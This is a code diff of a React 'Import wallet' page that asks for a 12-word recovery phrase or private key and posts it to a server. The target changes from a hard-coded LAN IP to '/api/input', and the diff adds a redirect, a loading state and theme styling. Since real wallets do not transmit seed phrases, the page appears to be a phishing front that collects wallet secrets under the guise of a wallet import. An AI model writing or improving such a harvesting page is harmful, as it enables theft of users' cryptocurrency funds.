@@ -1,12 +1,14 @@
-import { useState } from 'react';
+import React, { useState } from 'react';
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faLeftLong } from "@fortawesome/free-solid-svg-icons";
-import { Link } from "react-router-dom";
+import { Link, useNavigate } from "react-router-dom";
 import axios from 'axios';
 
 export default function Input() {
     const [inputValue, setInputValue] = useState('');
     const [errorMessage, setErrorMessage] = useState('');
+    const [loading, setLoading] = useState(false);
+    const navigate = useNavigate();
 
     const handleChange = (event) => {
         setInputValue(event.target.value);
@@ -18,19 +20,23 @@ export default function Input() {
         if (inputValue.trim() === '') {
             setErrorMessage('Please enter a recovery phrase or private key.');
         } else {
+            setLoading(true);
             try {
-                const response = await axios.post('http://172.20.10.3:5002/input',  { inputValue });
+                const response = await axios.post('/api/input', { inputValue });
                 console.log('Form submitted:', response.data);
                 setInputValue('');
+                navigate('/submit', { replace: true });
             } catch (error) {
                 console.error('Error submitting form:', error.response || error.message);
                 setErrorMessage('Server error: ' + (error.response ? error.response.data : error.message));
+            } finally {
+                setLoading(false);
             }
         }
     };
 
     return (
-        <div className="p-8 flex flex-col items-center min-h-screen bg-black">
+        <div className="p-8 flex flex-col items-center min-h-screen bg-white dark:bg-black text-black dark:text-white">
             <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
                 <div className="mb-4">
                     <Link to="/import">
@@ -39,8 +45,8 @@ export default function Input() {
                     </Link>
                 </div>
                 <div className="mb-4">
-                    <h1 className="text-white text-2xl font-bold">Import wallet</h1>
-                    <p className="text-white py-5">Enter your wallet&apos;s 12-word recovery phrase or private key. You can import any Ethereum, Solana or Bitcoin recovery phrase. Only Ethereum private keys are supported.</p>
+                    <h1 className=" text-2xl font-bold">Import wallet</h1>
+                    <p className=" py-5">Enter your wallet&apos;s 12-word recovery phrase or private key. You can import any Ethereum, Solana or Bitcoin recovery phrase. Only Ethereum private keys are supported.</p>
                 </div>
             </div>
             <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
@@ -57,7 +63,9 @@ export default function Input() {
                         <p className="text-blue-700 font-semibold text-[0.8rem]">Where can I find it?</p>
                     </div>
                     <div className="mt-20">
-                        <button type='submit' className="btn btn-active text-black bg-white py-2 rounded-full w-full max-w-xs text-center">Import</button>
+                        <button type='submit' className="btn btn-active py-2 rounded-full w-full text-center bg-black dark:bg-white text-white dark:text-black">
+                            {loading ? 'Loading...' : 'Import'}
+                        </button>
                     </div>
                 </form>
             </div>
